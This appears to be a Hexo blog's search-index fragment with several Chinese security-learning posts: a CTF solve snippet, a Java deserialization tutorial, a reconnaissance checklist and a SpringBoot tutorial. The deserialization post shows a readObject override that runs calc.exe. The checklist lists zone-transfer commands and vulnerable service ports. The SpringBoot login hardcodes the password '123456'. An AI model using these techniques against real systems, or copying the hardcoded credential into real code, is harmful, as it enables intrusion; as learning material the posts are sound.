0x00000019, 0x0000001C, 0x00000012, 0x00000010, 0x00000000, 0x00000008, 0x00000011, 0x00000001, 0x00000015, 0x00000003, 0x0000000A, 0x0000001D, 0x0000000C, 0x00000016, 0x00000018, 0x0000000D, 0x0000001B, 0x00000005, 0x00000007, 0x00000006, 0x00000013, 0x0000001A]print(len(v))strs = &quot;23gJba3au9mnk3c10:0zp8qJr41H39jp&quot;strs = [ord(i) for i in strs]flag = []for i in v: flag.append(strs[i])for i in range(len(flag)): print(chr(flag[i]^en[i]),end=&quot;&quot;) 得到 flag","tags":["ctf","刷题","比赛"],"categories":["CTF"]},{"title":"Quick Start","path":"/2024/07/17/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment"},{"title":"序列化与反序列化","path":"/2024/07/12/java/开发/序列化与反序列化/","content":"开启 java 安全学习第二站，java 序列化与反序列化 0x01 意义我们都知道就算是一条内裤都有它的作用和意义，那么序列化和反序列化存在的意义又是什么呢？也就是说我们可以用这东西来干什么？ 实现两个进程间对象的传输 这个就是 java 序列化和反序列化的定义了，前者将对象转化为字节流数据，后者将字节流数据还原为对象 实现数据的持久化 对象序列化之后可以把字节数据写入文件中（硬盘里），这样就可以减轻内存的负担，再用的时候反序列化还原即可。比如配置信息，用户的数据等等。 规范传递格式，方便网络传输 这个也很好理解，文本音频视频这些数据全被序列化为二进制数据了，当然很好传输。 0x02 序列化与反序列化的实现序列化的实现 实现 Serializable 接口：将要序列化的类实现 Serializable 接口。 创建ObjectOutputStream：创建一个ObjectOutputStream对象，用于将对象序列化为字节流。 写入对象：使用writeObject()方法将对象写入到输出流中。 123456789101112131415161718192021222324252627282930313233import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.io.Serializable;class Student implements Serializable &#123; private String name; private int age; public Student(String name, int age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return name; &#125; public int getAge() &#123; return age; &#125;&#125;public class Serialization &#123; public static void main(String[] args) &#123; Student stu = new Student(&quot;she11F&quot;,18); try(ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;student.bin&quot;)))&#123; oos.writeObject(stu); &#125;catch(IOException e)&#123; e.printStackTrace(); &#125; &#125;&#125; 这样把一个学生的实例序列化成了二进制数据，并且写入了 student.bin 文件中 反序列化的实现 创建 ObjectInputStream：创建一个ObjectInputStream对象，用于从字节流中读取对象。 读取对象：使用 readObject() 方法从输入流中读取对象。 1234567891011121314import java.io.FileInputStream;import java.io.ObjectInputStream;public class DeSerialization &#123; public static void main(String[] args) &#123; try(ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;student.bin&quot;)))&#123; Student stu = (Student) ois.readObject(); System.out.println(stu.getName()); System.out.println(stu.getAge()); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 0x03 漏洞jdk 提供重写 writeObject，readObject 的权限 12private void writeObject(java.io.ObjectOutputStream s)throws java.io.IOExceptionprivate void readObject(java.io.ObjectInputStream s)throws java.io.IOException, ClassNotFoundException 而且默认执行用户重写的，用户没有重写则调用系统的。那我们重写 readObject 夹带危险函数，那么服务器端反序列化的时候就有可能中招了 我们在 Student 类里重新定义 readObject 1234private void readObject(ObjectInputStream ois)throws java.io.IOException, ClassNotFoundException&#123; ois.defaultReadObject(); // 执行默认的反序列化 Runtime.getRuntime().exec(&quot;calc.exe&quot;); // 危险代码&#125; 然后序列化这个类再反序列化就会弹计算器了，当然现实开发中不太可能暴漏这种接口，所以得学其他思想，我先去学了，后面再做补充","tags":["java 开发"],"categories":["开发"]},{"title":"信息收集流程","path":"/2024/07/10/work/信息收集流程/","content":"星期五要做知识分享，啥也不会就分享分享信息收集吧，遇上新的方法再做补充 企业资产信息收集 股权投资信息 一般要求50%持股或者100% 持股都可以算测试目标 企查查 天眼查 组织架构信息 组织架构信息指的是目标单位的下级单位，分支机构，内部组织架构等信息。默认情况下，位于目标单位组织架构下的单位都属于资产范围，可以去官网查看这类消息 地址一 - 绿盟科技-巨人背后的专家 (nsfocus.com.cn) 域名信息收集0x01 一级域名收集 天眼查，企查查，爱企查 域名备案信息查询系统 0x02 子域名信息收集可以发现目标单位对外开放的更多资产 https://crt.sh/ 引用谷歌的项目介绍：“要向用户提供加密流量，网站必须先向可信的证书授权中心 (CA) 申请证书。然后，当用户尝试访问相应网站时，此证书即会被提供给浏览器以验证该网站。近年来，由于 HTTPS 证书系统存在结构性缺陷，证书以及签发证书的 CA 很容易遭到入侵和操纵。Google 的证书透明度项目旨在通过提供一个用于监测和审核 HTTPS 证书的开放式框架，来保障证书签发流程安全无虞。” DNS 域传送 域传送操作是指备用服务器向主服务器查询来刷新自己的Zone数据库，保证数据一致性。此操作的目的是为了防止主域名服务器因意外故障变得不可用时影响到全局。正常情况下,只有在网络里存在备用域名 DNS 服务器时，DNS区域传送操作才有必要执行。一旦DNS服务器被错误地配置成任何人发出请求，都向其提供Zone数据库的拷贝，就会被攻击者利用。 实现方法： 1.dig命令如dig @ns2.xxx.com xxx.com axfrns2.xxx.com为提供数据的服务器，xxx.com为要传输的关键字，axfr为区域传输选项。 2.python中dns库xfr &#x3D; dns.query.xfr(where&#x3D;server, zone&#x3D;self.domain, timeout&#x3D;5.0, lifetime&#x3D;10.0)zone &#x3D; dns.zone.from_xfr(xfr) 一般情况下，DNS服务器都配置正确，关闭了dns传输或设置了白名单，漏洞利用成功的概率较低。 搜索引擎&#x2F;网络空间搜索引擎 google 语法 site:nsfocus.com -www fofa domain=&quot;nsfocus.com&quot; 子域名爆破 字典拼接，layer 自动化收集工具 现在很多自动化工具已经集成了很多种收集方式，比如 subfinder，oneforall 公网IP收集 ping命令 ：ping命令会回显出对方域名对应的IP，但只有一个，一般是非权威应答。 nslooup：会返回自己的服务器以及对方所有的服务器 dig +域名 ：回显出域名对应的服务器 站长工具IP whois：https://tool.chinaz.com/ipwhois 根据 IP 寻找 Web 服务0x01 收集 IP 开放的脆弱端口12345671099 javarmi1433 mssql1521 oracle3306 mysql6379 redis7000 - 10000 常见web服务端口 40000-60000 向日葵 RCE 推荐工具 TxPortMax 0x02 收集公网 IP 的 Web 指纹 识别网页 &#x2F;HTML&#x2F;CSS&#x2F;JS 或者 robots.txt 的关键字，图标，文件后缀，特征目录 抓包看 http 返回消息，提取 server 字段 通过应用所在端口进行判断，比如 7001 是 weblogic 通过报错页面判断 通过二开的框架判断，比如 tp，若依 通过插件比如 Wappalyzer 0x03 Web 系统目录扫描 后台管理地址 安装包，网站备份文件 上传目录，下载目录 mysql 管理接口，phpinfo 界面 cms，框架的安装或者默认界面 网站配置文件，如 WEB-INF&#x2F;web.xml 未授权 api 接口 0x04 Web 系统 JS 文件分析 jsfinder 浏览器插件 0x05 Web 系统报错信息 改 http 方法 增删改参数 找系统特性 特殊符号 Sql 错误 收集目标企业移动端资产 天眼查，小蓝本 第三方应用市场，厂商关键字 Appstore 查看开发者信息 微信搜索小程序，公众号 搜狗搜索小程序 收集目标公网泄露信息 github 语雀 个人敏感信息收集 社工库 信息收集自动化 灯塔 ez","tags":["渗透测试","实战"],"categories":["打工人的三两事"]},{"title":"SpringBoot 学习","path":"/2024/07/10/java/开发/SpringBoot/","content":"开启 java 安全学习第一站，SpringBoot 创建第一个 SpringBoot 项目可以官网导入创建，这里就直接 IJ 导入了，方便一些。 0x01 打开 IDEA，新建项目注意到Spring Boot 官方不再支持 Spring Boot 的 2.x 版本了，之后全力维护 3.x；而 Spring Boot 3.x 对 JDK 版本的最低要求是 17！所以我们选不了 java8 语言版本，我可以替换 Server URL 为阿里的镜像站，这样就可以选了 https://start.aliyun.com/ 0x02 选择 SpringBoot 版本，配置依赖这里 jdk8 的话—定要选 SpringBoot 小于3.0.0的版本，依赖先添加一个 Spring Web，也可以不添加 创建完成后把 demo 目录删掉 0x03 配置启动端口，并且测试在 resources 文件夹下找到 application.properties 文件，设置启动端口为 8088 1server.port=8088 编写一个控制类 在启动页面同一级目录下，创建 controller 文件夹 编写 12345678910111213package com.she11f.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestController@RequestMapping(&quot;/hello&quot;)public class HelloWorld &#123; @RequestMapping(&quot;/hello&quot;) public String helloWorld() &#123; return &quot;Hello World!&quot;; &#125;&#125; 其中：@RestController &#x3D; @Controller + @ResponseBody 而@ResponseBody ： 该注解用于将Controller 的方法返回对象，通过适当的HttpMessageConverter转换为指定格式后，写入Response对象的body数据区。 @Controller 不用解释了 另外：@RequestMapping ：用来处理请求地址映射的注解，可用于类或方法上。 也可以写作 GetMapping 、PostMapping、PutMapping 、DeleteMapping 、PatchMapping。这些在后面的文章我们在详细说明。 然后直接启动，访问 127.0.0.1:8088&#x2F;hello&#x2F;hello 也可以把程序打包成 jar 包，然后命令行启动。点击 Maven 生命周期里的 package ，install 然后在 target 目录下发现一个 jar 包就证明打包成功了。 还能 DIY 一下，更改启动时banner图案。到项目下的 resources 目录下新建一个banner.txt 即可: 图案可以到网站 https://www.bootschool.net/ascii 生成，拷贝到文件中即可！ SpringBoot 运行原理贴个链接吧，感觉这个对开发来说都很难理解，先学会如何用吧。 Spring Boot：最全SpringBoot启动流程原理分析(全网最全最完善)-腾讯云开发者社区-腾讯云 (tencent.com) Yaml 语法SpringBoot使用一个全局的配置文件 ， 配置文件名称是固定的 application.properties 语法结构 ：key&#x3D;value application.yml 语法结构 ：key：空格 value 配置文件的作用 ：修改SpringBoot自动配置的默认值，因为SpringBoot在底层都给我们自动配置好了； 就比如我们在项目创建的时候修改过 tomcat 启动端口为 8088，就是在 **application.properties **文件中修改。 0x01 yaml概述传统xml配置： 1&lt;server&gt;&lt;port&gt;8081&lt;port&gt;&lt;/server&gt; yaml配置： 12server： prot: 8080 说明：语法要求严格！ 空格不能省略 以缩进来控制层级关系，只要是左边对齐的一列数据都是同一个层级的。 属性和值的大小写都是十分敏感的。 0x02 基本写法对象、Map（键值对） 1#对象、Map格式k: v1: v2: 在下一行来写对象的属性和值得关系，注意缩进；比如： 123student: name: she11F age: 3 对了，我用的这个博客 hexo 配置文件就是用的 yaml 行内写法 1student: &#123;name: qinjiang,age: 3&#125; 数组（ List、set ） 用 - 值表示数组中的一个元素,比如： 1234pets: - cat - dog - pig 行内写法 1pets: [cat,dog,pig] yaml 修改端口号的话就是这样写 12server: port: 8082 我们删除 application.properties ，新建 application.yaml Web开发0x01 静态资源处理 webjars 导入 Webjars本质就是以jar包的方式引入我们的静态资源 ， 我们以前要导入一个静态资源文件，直接导入即可。 网站：https://www.webjars.org 比如说要使用jQuery，选择 maven 坐标，我们只要要引入jQuery对应版本的pom依赖即可！ 12345&lt;dependency&gt; &lt;groupId&gt;org.webjars.npm&lt;/groupId&gt; &lt;artifactId&gt;github-com-jquery-jquery&lt;/artifactId&gt; &lt;version&gt;3.6.0&lt;/version&gt;&lt;/dependency&gt; 访问：只要是静态资源，SpringBoot就会去对应的路径寻找资源，我们这里访问：127.0.0.1:8088&#x2F;webjars&#x2F;jquery&#x2F;3.4.1&#x2F;jquery.js 就能看到 jquery 源码 静态资源映射规则 ​\t可以在 resources 文件夹下建立 public，static，resources，templates 文件夹来存放静态文件，比如在 public 下创办 1.js ​\t访问路径 127.0.0.1:8088&#x2F;1.js，它就会自动去寻找 0x02 thymeleaf 模板引擎 模板引擎的作用就是我们来写一个页面模板，比如有些值呢，是动态的，我们写一些表达式。而这些值，从哪来呢，就是我们在后台封装一些数据。然后把这个模板和这个数据交给我们模板引擎，模板引擎按照我们这个数据帮你把这表达式解析、填充到我们指定的位置，然后把这个数据最终生成一个我们想要的内容给我们写出去，这就是我们这个模板引擎，不管是jsp还是其他模板引擎，都是这个思想。只不过呢，就是说不同模板引擎之间，他们可能这个语法有点不一样。其他的我就不介绍了，我主要来介绍一下SpringBoot 给我们推荐的 Thymeleaf 模板引擎，这模板引擎呢，是一个高级语言的模板引擎，他的这个语法更简单。而且呢，功能更强大。 jsp支持非常强大的功能，包括能写Java代码，但是呢，我们现在的这种情况，SpringBoot这个项目首先是以jar的方式，不是war，像第二，我们用的还是嵌入式的Tomcat，所以呢，他现在默认是不支持jsp的 Thymeleaf 官网：https://www.thymeleaf.org/ Thymeleaf 在Github 的主页：https://github.com/thymeleaf/thymeleaf Spring官方文档：找到我们对应的版本 https://docs.spring.io/spring-boot/docs/2.2.5.RELEASE/reference/htmlsingle/#using-boot-starter 找到对应的pom依赖：可以适当点进源码看下本来的包！ 12345&lt;!--thymeleaf--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;&lt;/dependency&gt; Maven会自动下载jar包，我们可以去看下下载的东西； 使用： 我们只需要把我们的html页面放在类路径下的 templates 下，thymeleaf就可以帮我们自动渲染了。在 templates 文件夹下新建 index.html 文件 要使用thymeleaf，需要在html文件中导入命名空间的约束，方便提示。可以去官方文档的#3中看一下命名空间拿来过来 1xmlns:th=&quot;http://www.thymeleaf.org&quot; 编写 html 页面 12345678910111213&lt;!DOCTYPE html&gt;&lt;!--使用http://www.thymeleaf.org/thymeleaf-extras-spring,红色下划线消失--&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;测试页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Test&lt;/h1&gt;&lt;!--th:text就是将div中的内容设置为它指定的值，和之前学习的Vue一样--&gt;&lt;div th:text=&quot;$&#123;msg&#125;&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; templates 目录下所有页面，只能通过 controller 来跳转。创建一个 test.html,控制器里的映射必须是 test 才行 12345678910111213141516package com.she11f.controller;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;@Controllerpublic class ThymeleafDemo &#123; @RequestMapping(&quot;/test&quot;) public String test1(Model model)&#123; //存入数据 model.addAttribute(&quot;msg&quot;,&quot;Hello,Thymeleaf&quot;); //classpath:/templates/test.html return &quot;test&quot;; &#125;&#125; 访问 http://127.0.0.1:8088/test 控制器页面 1234567891011121314151617181920package com.she11f.controller;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import java.util.Arrays;import java.util.Map;@Controllerpublic class ThymeleafDemo &#123; @RequestMapping(&quot;/test&quot;) public String test2(Map&lt;String,Object&gt; map)&#123; //存入数据 map.put(&quot;msg&quot;,&quot;&lt;h1&gt;Hello&lt;/h1&gt;&quot;); map.put(&quot;users&quot;, Arrays.asList(&quot;zhangsan&quot;,&quot;lisi&quot;)); //classpath:/templates/test.html return &quot;test&quot;; &#125;&#125; html 页面语法其实和 vue 差不多 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;测试页面&lt;/h1&gt;&lt;div th:text=&quot;$&#123;msg&#125;&quot;&gt;&lt;/div&gt;&lt;!--不转义--&gt;&lt;div th:utext=&quot;$&#123;msg&#125;&quot;&gt;&lt;/div&gt;&lt;!--遍历数据--&gt;&lt;!--th:each每次遍历都会生成当前这个标签：官网#9--&gt;&lt;h4 th:each=&quot;user :$&#123;users&#125;&quot; th:text=&quot;$&#123;user&#125;&quot;&gt;&lt;/h4&gt;&lt;h4&gt; &lt;!--行内写法：官网#12--&gt; &lt;span th:each=&quot;user:$&#123;users&#125;&quot;&gt;[[$&#123;user&#125;]]&amp;nbsp;&lt;/span&gt;&lt;/h4&gt;&lt;/body&gt;&lt;/html&gt; 员工管理系统搭建素材来自于 链接：https://pan.baidu.com/s/1ITFMd_myJBYI3zv1N9w_Aw 提取码：z7x8 0x01 准备工作先导入四个静态页面导入 templates 文件夹下，静态资源放入 static 文件夹 暂时手动模拟数据库 编写 pojo 层 员工表 1234567891011121314151617181920212223242526package com.she11f.pojo;import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor;import java.util.Date;//员工表@Data@NoArgsConstructorpublic class Employee &#123; private Integer id; private String lastName; private String email; private Integer gender; //性别 0 女， 1，男 private Department department; private Date birth; public Employee(Integer id, String lastName, String email, Integer gender, Department department) &#123; this.id = id; this.lastName = lastName; this.email = email; this.gender = gender; this.department = department; this.birth = new Date(); &#125;&#125; 部门表 123456789101112package com.she11f.pojo;import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor;//部门表@Data@AllArgsConstructor@NoArgsConstructorpublic class Department &#123; private int id; //部门id private String departmentName; //部门名字&#125; 添加lombok依赖 12345&lt;!--lombok--&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; 编写dao层 部门 dao 12345678910111213141516171819202122232425262728293031323334353637package com.she11f.dao;import com.she11f.pojo.Department;import org.springframework.stereotype.Repository;import java.util.Collection;import java.util.HashMap;import java.util.Map;//部门dao@Repositorypublic class DepartmentDao &#123; //模拟数据库中的数据 private static Map&lt;Integer, Department&gt;departments = null; static &#123; departments = new HashMap&lt;Integer, Department&gt;(); //创建一个部门表 departments.put(101,new Department(101,&quot;教学部&quot;)); departments.put(102,new Department(102,&quot;市场部&quot;)); departments.put(103,new Department(103,&quot;教研部&quot;)); departments.put(104,new Department(104,&quot;运营部&quot;)); departments.put(105,new Department(105,&quot;后勤部&quot;)); &#125; //获取所有的部门信息 public Collection&lt;Department&gt; getDepartments()&#123; return departments.values(); &#125; //通过id得到部门 public Department getDepartmentById(Integer id)&#123; return departments.get(id); &#125;&#125; 员工dao 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package com.she11f.dao;import com.she11f.pojo.Department;import com.she11f.pojo.Employee;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Repository;import java.util.Collection;import java.util.HashMap;import java.util.Map;//员工dao@Repository //被string托管public class EmployeeDao &#123; //模拟数据库中的数据 private static Map&lt;Integer, Employee&gt; employees= null; //员工所属的部门 @Autowired private DepartmentDao departmentDao; static &#123; employees = new HashMap&lt;Integer,Employee&gt;(); //创建一个部门表 employees.put(1001,new Employee( 1001,&quot;AA&quot;,&quot;1622840727@qq.com&quot;,1,new Department(101,&quot;教学部&quot;))); employees.put(1002,new Employee( 1002,&quot;BB&quot;,&quot;2622840727@qq.com&quot;,0,new Department(102,&quot;市场部&quot;))); employees.put(1003,new Employee( 1003,&quot;CC&quot;,&quot;4622840727@qq.com&quot;,1,new Department(103,&quot;教研部&quot;))); employees.put(1004,new Employee( 1004,&quot;DD&quot;,&quot;5628440727@qq.com&quot;,0,new Department(104,&quot;运营部&quot;))); employees.put(1005,new Employee( 1005,&quot;FF&quot;,&quot;6022840727@qq.com&quot;,1,new Department(105,&quot;后勤部&quot;))); &#125; //主键自增 private static Integer ininId = 1006; //增加一个员工 public void save(Employee employee)&#123; if(employee.getId() == null)&#123; employee.setId(ininId++); &#125; employee.setDepartment(departmentDao.getDepartmentById(employee.getDepartment().getId())); employees.put(employee.getId(),employee); &#125; //查询全部的员工 public Collection&lt;Employee&gt;getALL()&#123; return employees.values(); &#125; //通过id查询员工 public Employee getEmployeeById(Integer id)&#123; return employees.get(id); &#125; //删除一个员通过id public void delete(Integer id)&#123; employees.remove(id); &#125;&#125; 0x02 首页实现引入Thymeleaf 12345678&lt;dependency&gt; &lt;groupId&gt;org.thymeleaf&lt;/groupId&gt; &lt;artifactId&gt;thymeleaf-spring5&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.thymeleaf.extras&lt;/groupId&gt; &lt;artifactId&gt;thymeleaf-extras-java8time&lt;/artifactId&gt;&lt;/dependency&gt; 编写 MyMvcConfig 123456789101112131415package com.she11f.config;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.ViewControllerRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;//扩展使用SpringMVC@Configurationpublic class MyMvcConfig implements WebMvcConfigurer &#123; @Override public void addViewControllers(ViewControllerRegistry registry) &#123; registry.addViewController(&quot;/&quot;).setViewName(&quot;index&quot;); registry.addViewController(&quot;/index.html&quot;).setViewName(&quot;index&quot;); &#125;&#125; 用 thymeleaf 语法更改静态资源路径 所有的静态资源路径都需要使用thymeleaf接管：@{}，th:href,th:src 12&lt;link href=&quot;asserts/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link th:href=&quot;@&#123;/css/bootstrap.min.css&#125;&quot; rel=&quot;stylesheet&quot;&gt; application.yml 修改 1234# 关闭模板引擎的缓存spring: thymeleaf: cache=false: 启动程序，打开 localhost:8088,首页设置成功 0x03 登录+拦截器先给登陆页面表单提交写一个 controller,登录页先换成 thymeleaf 语法。 1&lt;form class=&quot;form-signin&quot; th:action=&quot;@&#123;/user/login&#125;&quot; method=&quot;post&quot;&gt; &#x2F;&#x2F; 这里面的所有 input 标签都需要加上一个name属性，不然拦截器得不到参数 编写 MyMvcConfig 1registry.addViewController(&quot;/main.html&quot;).setViewName(&quot;dashboard&quot;); 编写 LoginController 123456789101112131415161718@Controllerpublic class LoginController &#123; @RequestMapping(&quot;/user/login&quot;) public String login( @RequestParam(&quot;username&quot;) String username , @RequestParam(&quot;password&quot;) String password, Model model)&#123; //具体的业务 if(!StringUtils.isEmpty(username)&amp;&amp;&quot;123456&quot;.equals(password))&#123; return &quot;redirect:/main.html&quot;; &#125; else&#123; //告诉用户，你登录失败 model.addAttribute(&quot;msg&quot;,&quot;用户名或者密码错误！&quot;); return &quot;index&quot;; &#125; &#125;&#125; 测试成功登录 登录失败的话，我们需要将后台信息输出到前台，可以在首页标题下面加上判断 123&lt;!--判断是否显示，使用if, $&#123;&#125;可以使用工具类，可以看thymeleaf的中文文档--&gt; &lt;p style=&quot;color: red&quot; th:text=&quot;$&#123;msg&#125;&quot; th:if=&quot;$&#123;not #strings.isEmpty(msg)&#125;&quot;&gt; &lt;/p&gt; 接着添加拦截器，在 LoginController 页面添加 session 1session.setAttribute(&quot;loginUser&quot;,username); 在 config 下自定义一个拦截器 LoginHandlerInterceptor 1234567891011121314151617181920212223package com.she11f.config;import org.springframework.web.servlet.HandlerInterceptor;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;//自定义拦截器public class LoginHandlerInterceptor implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; //获取 loginUser 信息进行判断 Object user = request.getSession().getAttribute(&quot;loginUser&quot;); if(user == null)&#123;//未登录，返回登录页面 request.setAttribute(&quot;msg&quot;,&quot;没有权限，请先登录&quot;); request.getRequestDispatcher(&quot;/index.html&quot;).forward(request,response); return false; &#125;else&#123; //登录，放行 return true; &#125; &#125;&#125; 然后将拦截器注册到我们的 SpringMVC 配置类当中！ 12345678@Override public void addInterceptors(InterceptorRegistry registry) &#123; // 注册拦截器，及拦截请求和要剔除哪些请求! // 我们还需要过滤静态资源文件，否则样式显示不出来 registry.addInterceptor(new LoginHandlerInterceptor()) .addPathPatterns(&quot;/**&quot;) .excludePathPatterns(&quot;/index.html&quot;,&quot;/user/login&quot;,&quot;/&quot;,&quot;/css/*&quot;,&quot;/img/**&quot;,&quot;/js/**&quot;);&#125; 我们然后在后台主页，获取用户登录的信息 12&lt;!--后台主页显示登录用户的信息--&gt;[[$&#123;session.loginUser&#125;]] &lt;!--$取EL表达式--&gt; 0x04 员工列表展示 将首页的侧边栏Customers改为员工管理、 添加 a 链接跳转 1&lt;a class=&quot;nav-link&quot; th:href=&quot;@&#123;/emps&#125;&quot;&gt;员工管理&lt;/a&gt; list 移动至 emp 文件夹下 编写处理请求的controller 1234567891011121314151617181920212223242526package com.she11f.controller;import com.she11f.dao.EmployeeDao;import com.she11f.pojo.Employee;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import java.util.Collection;//员工列表@Controllerpublic class EmployeeController &#123; @Autowired EmployeeDao employeeDao; @RequestMapping(&quot;/emps&quot;) public String list(Model model)&#123; Collection&lt;Employee&gt; employees = employeeDao.getALL(); model.addAttribute(&quot;emps&quot;,employees); return &quot;emp/list&quot;; &#125;&#125; 拿一下数据顺便美化一下页面 123456789101112131415161718192021222324&lt;thead&gt; &lt;tr&gt; &lt;th&gt;id&lt;/th&gt; &lt;th&gt;lastName&lt;/th&gt; &lt;th&gt;email&lt;/th&gt; &lt;th&gt;gender&lt;/th&gt; &lt;th&gt;department&lt;/th&gt; &lt;th&gt;birth&lt;/th&gt; &lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt; &lt;tr th:each=&quot;emp:$&#123;emps&#125;&quot;&gt; &lt;td th:text=&quot;$&#123;emp.getId()&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;emp.getLastName()&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;emp.getEmail()&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;emp.getGender()==0?&#x27;女&#x27;:&#x27;男&#x27;&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;emp.department.getDepartmentName()&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;#dates.format(emp.getBirth(),&#x27;yyyy-MM-dd HH:mm:ss&#x27;)&#125;&quot;&gt;&lt;/td&gt; &lt;td&gt; &lt;button class=&quot;btn btn-sm btn-primary&quot;&gt;编辑&lt;/button&gt; &lt;button class=&quot;btn btn-sm btn-danger&quot;&gt;删除&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt; 0x05 添加员工先修改跳转链接 1&lt;h2&gt;&lt;a class=&quot;btn btn-sm btn-success&quot; th:href=&quot;@&#123;/emp&#125;&quot;&gt;添加员工&lt;/a&gt;&lt;/h2&gt; 在员工控制器里加一条规则 1234@RequestMapping(&quot;/emp&quot;) public String toAddPage()&#123; return &quot;emp/add&quot;; &#125; 编写 add.html,复制 list.html 然后把表单部分换进来 12345678910111213141516171819202122232425262728&lt;form th:action=&quot;@&#123;/emp&#125;&quot; method=&quot;post&quot; &gt; &lt;div class=&quot;form-group&quot; &gt;&lt;label&gt;LastName&lt;/label&gt; &lt;input class=&quot;form-control&quot; placeholder=&quot;she11F&quot; type=&quot;text&quot; name=&quot;lastName&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot; &gt;&lt;label&gt;Email&lt;/label&gt; &lt;input class=&quot;form-control&quot; placeholder=&quot;2097688176@qq.com&quot; type=&quot;email&quot; name=&quot;email&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt;&lt;label&gt;Gender&lt;/label&gt;&lt;br/&gt; &lt;div class=&quot;form-check form-check-inline&quot;&gt; &lt;input class=&quot;form-check-input&quot; name=&quot;gender&quot; type=&quot;radio&quot; value=&quot;1&quot;&gt; &lt;label class=&quot;form-check-label&quot;&gt;男&lt;/label&gt; &lt;/div&gt; &lt;div class=&quot;form-check form-check-inline&quot;&gt; &lt;input class=&quot;form-check-input&quot; name=&quot;gender&quot; type=&quot;radio&quot; value=&quot;0&quot;&gt; &lt;label class=&quot;form-check-label&quot;&gt;女&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot; &gt;&lt;label&gt;department&lt;/label&gt; &lt;select class=&quot;form-control&quot; name=&quot;department.id&quot;&gt; &lt;option th:each=&quot;dept:$&#123;departments&#125;&quot; th:text=&quot;$&#123;dept.getDepartmentName()&#125;&quot; th:value=&quot;$&#123;dept.getId()&#125;&quot;&gt;&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot; &gt; &lt;label &gt;Birth&lt;/label&gt; &lt;input class=&quot;form-control&quot; placeholder=&quot;2024/7/10&quot; type=&quot;text&quot; name=&quot;birth&quot;&gt; &lt;/div&gt; &lt;button class=&quot;btn btn-primary&quot; type=&quot;submit&quot;&gt;添加&lt;/button&gt; &lt;/form&gt; 编写一个&#x2F;emp post 控制器来实现表单提交 12345678910//员工添加功能//接收前端传递的参数，自动封装成为对象[要求前端传递的参数名，和属性名一致] @PostMapping(&quot;/emp&quot;) public String addEmp(Employee employee)&#123; //保存员工的信息 System.out.println(employee); employeeDao.save(employee); // 回到员工列表页面，可以使用redirect或者forward，就不会被视图解析器解析 return &quot;redirect:/emps&quot;; &#125; 添加成功 0x06 修改员工信息修改跳转链接的位置 1&lt;a class=&quot;btn btn-sm btn-primary&quot; th:href=&quot;@&#123;/emp/&#125;+$&#123;emp.getId()&#125;&quot;&gt;编辑&lt;/a&gt; 编写跳转控制器 1234567891011//员工修改页面@GetMapping(&quot;/emp/&#123;id&#125;&quot;)public String toUpdateEmp(@PathVariable(&quot;id&quot;) Integer id,Model model)&#123; Employee employee = employeeDao.getEmployeeById(id); model.addAttribute(&quot;emp&quot;,employee); //查询所有的部门信息 Collection&lt;Department&gt; departments = departmentDao.getDepartments(); model.addAttribute(&quot;departments&quot;,departments); return &quot;emp/update&quot;;&#125; 编写 update 页面，复制 add 页面，修改其表单 